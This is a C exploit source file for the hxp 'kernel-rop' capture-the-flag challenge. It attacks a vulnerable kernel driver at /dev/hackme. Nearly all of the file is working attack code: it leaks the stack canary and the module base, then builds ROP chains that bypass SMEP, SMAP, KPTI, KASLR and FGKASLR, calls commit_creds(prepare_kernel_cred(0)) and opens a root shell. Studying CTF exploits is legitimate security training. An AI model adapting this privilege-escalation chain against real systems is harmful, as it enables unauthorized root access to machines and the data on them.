/**
 *
 * Exploit Title: final_sploit.c
 * Author: wetw0rk
 * Link: https://ctftime.org/task/14383
 *
 * Description: This exploit, exploits the kernel-rop challenge by hxp. It is a gret
 *              example for bypassing SMEP, KPTI, SMAP, KASLR and FGKASLR.
 *
 * Compile: gcc final_sploit.c -o initramfs/exploit -static
 *
 * */

#include <unistd.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>

int global_fd;

unsigned long int ksymtab_prepare_kernel_cred;
unsigned long int ksymtab_commit_creds;

unsigned long int commit_creds;
unsigned long int prepare_kernel_cred;

unsigned long int creds_struct;
unsigned long int r;

unsigned long int cookie;
unsigned long int image_base;
unsigned long int tmp_var;

unsigned long int user_cs;
unsigned long int user_ss;
unsigned long int user_rflags;
unsigned long int user_sp;

void save_state(void);
void open_device(void);
void leak_base(void);
void get_address(void);
void final_stager(void);
void get_commit_cred(void);
void get_prepare_kernel_cred(void);
void get_shell(void);

void controlled_leak(unsigned long int, unsigned long int);
void execute_function(unsigned long int, unsigned long int, unsigned long);

/*
 * void main()
 *   The exploit
 *
 * */
void
main()
{
  printf("[.] Saving register state CS|RFLAGS|SP|SS\n");
  save_state();

  printf("[.] Opening device driver\n");
  open_device();
  leak_base();

  printf("[.] Leaking commit_creds & prepare_kernel_cred\n");
  controlled_leak(ksymtab_commit_creds, (unsigned long int)get_commit_cred);
}

/*
 * void execute_function(unsigned long int function,
 *                       unsigned long int argv1,
 *                       unsigned long int userland_address)
 *
 *   This function takes the commit_creds and prepare_kernel_cred addresses leaked and executes
 *   them.
 *
 * */
void
execute_function(unsigned long int function,
		 unsigned long int argv1,
		 unsigned long int userland_address)
{
  unsigned long int payload[50];
  unsigned long int offset = 16;

  payload[offset++] = cookie;
  payload[offset++] = 0x0000000000000000;
  payload[offset++] = 0x0000000000000000;
  payload[offset++] = 0x0000000000000000;
  payload[offset++] = image_base + 0x6370; // pop rdi ; ret (overwritten return address}
  payload[offset++] = argv1;               // rdi <- argv1 (X)
  payload[offset++] = function;            // rax = prepare_kernel_cred(0) -> commit_creds(rax)
  payload[offset++] = image_base+0x200f26; // swapgs_restore_regs_andreturn_to_usermode+22 (kpti_trampoline)
  payload[offset++] = 0x0000000000000000;
  payload[offset++] = 0x0000000000000000;
  payload[offset++] = userland_address;
  payload[offset++] = user_cs;
  payload[offset++] = user_rflags;
  payload[offset++] = user_sp;
  payload[offset++] = user_ss;

  write(global_fd,
	payload,
	sizeof(payload));
}

void
get_cred_struct_pointer(void)
{
  __asm__(
  ".intel_syntax noprefix;"
  "mov tmp_var, rax;"
  ".att_syntax;"
  );

  creds_struct = tmp_var;
  printf("[.]   *cred struct: 0x%lx\n", creds_struct);
  execute_function(commit_creds, creds_struct, (unsigned long int)get_shell);
}

void
get_shell(void)
{
  if (getuid() == 0) {
    printf("[.] Enjoy you shell uid=%d(root) gid=%d(root)\n", getuid(), getgid());
    system("/bin/sh");
  }
}

/*
 * void controlled_leak(unsigned long int ksymtab,
 *                      unsigned long int userland_address);
 *
 *   This function leaks the address of commit_creds and prepare_kernel_cred by reading
 *   the first 4 bytes from its respective ksymtab entry (e.g __ksymtab_commit_creds).
 *   It takes 2 arguments argv1 being the function we are resolving and argv2 being the
 *   function we execute next.
 *
 *   Gadgets that make this happen (high level):
 *
 *     - pop rax                   ; First we POP the ksymtab address into RAX
 *     - ksymtab                   ;
 *     - mov eax, dword ptr [rax]  ; We then read 4 bytes from the base address
 *                                 ; of the function and store it in EAX.
 *
 *   Once this operation is done we can get the address by using the following equation:
 *    
 *     FUNCTION_ADDR = ksymtab + EAX
 *
 * */
void
controlled_leak(unsigned long int ksymtab,
		unsigned long int userland_address)
{
  unsigned long int payload[50];
  unsigned long int offset = 16;

  payload[offset++] = cookie;
  payload[offset++] = 0x0000000000000000;
  payload[offset++] = 0x0000000000000000;
  payload[offset++] = 0x0000000000000000;
  payload[offset++] = image_base + 0x4d11;   // pop rax ; ret (return address overwrite)
  payload[offset++] = ksymtab - 0x10;        // __ksymtab_prepare_kernel_cred & __ksymtab_commit_creds
  payload[offset++] = image_base + 0x4aae;   // mov eax, dword ptr [rax + 0x10] ; pop rbp ; ret
  payload[offset++] = 0x0000000000000000;
  payload[offset++] = image_base + 0x200f26; // swapgs_restore_regs_andreturn_to_usermode+22 (kpti_trampoline)
  payload[offset++] = 0x0000000000000000;
  payload[offset++] = 0x0000000000000000;
  payload[offset++] = userland_address;
  payload[offset++] = user_cs;
  payload[offset++] = user_rflags;
  payload[offset++] = user_sp;
  payload[offset++] = user_ss;

  write(global_fd,
        payload,
	sizeof(payload));
}

void
get_commit_cred(void)
{
  __asm__(
  ".intel_syntax noprefix;"
  "mov tmp_var, rax;"
  ".att_syntax;"
  );

  commit_creds = ksymtab_commit_creds + (int)tmp_var;
  printf("[.]   commit_creds: 0x%lx\n", commit_creds);
  controlled_leak(ksymtab_prepare_kernel_cred, (unsigned long int)get_prepare_kernel_cred);
}

void
get_prepare_kernel_cred(void)
{
  __asm__(
  ".intel_syntax noprefix;"
  "mov tmp_var, rax;"
  ".att_syntax;"
  );

  prepare_kernel_cred = ksymtab_prepare_kernel_cred + (int)tmp_var;
  printf("[.]   prepare_kernel_cred: 0x%lx\n", prepare_kernel_cred);
  printf("[.] Executing prepare_kernel_cred(0)\n");
  execute_function(prepare_kernel_cred, 0, (unsigned long int)get_cred_struct_pointer);
}

/*
 * void leak_base()
 *   Leaks the canary and base address of the kernel module. Using this base
 *   we can find the locations of __ksymtab_prepare_kernel_cred and __ksymtab_commit_creds
 *   which we will later using to dynamically obtian addresses to commit_creds and
 *   prepare_kernel_cred.
 *
 *   We were able to verify these using /proc/kallsyms
 *
 * */
void
leak_base(void)
{
  unsigned long int leak[50];

  r = read(global_fd,
	   leak,
	   sizeof(leak));

  printf("[.] Leaking %zd bytes\n", r);

  cookie = leak[16];
  image_base = leak[38] - 0xa157;
  ksymtab_commit_creds = image_base + 0xf87d90;
  ksymtab_prepare_kernel_cred = image_base + 0xf8d4fc;

  printf("[.]   canary: 0x%lx\n", cookie);
  printf("[.]   image base: 0x%lx\n", image_base);
  printf("[.]   __ksymtab_commit_creds: 0x%lx\n", ksymtab_commit_creds);
  printf("[.]   __ksymtab_prepare_kernel_cred: 0x%lx\n", ksymtab_prepare_kernel_cred); 
}

/*
 * void open_device()
 *   Opens a file handle on the vulnerable device driver
 *
 * */
void
open_device(void)
{
  global_fd = open("/dev/hackme", O_RDWR);
  if (global_fd < 0) {
    printf("[-] Failed to open device driver\n");
    exit(-1);
  }
}

/*
 * void save_state()
 *   Saves the state of CS|RFLAGS|SP|SS proir to kernel-land entry for a safe return
 *
 * */
void
save_state(void)
{
  __asm__(
  ".intel_syntax noprefix;"
  "mov user_cs, cs;"
  "mov user_ss, ss;"
  "mov user_sp, rsp;"
  "pushf;"
  "pop user_rflags;"
  ".att_syntax;"
  );
}
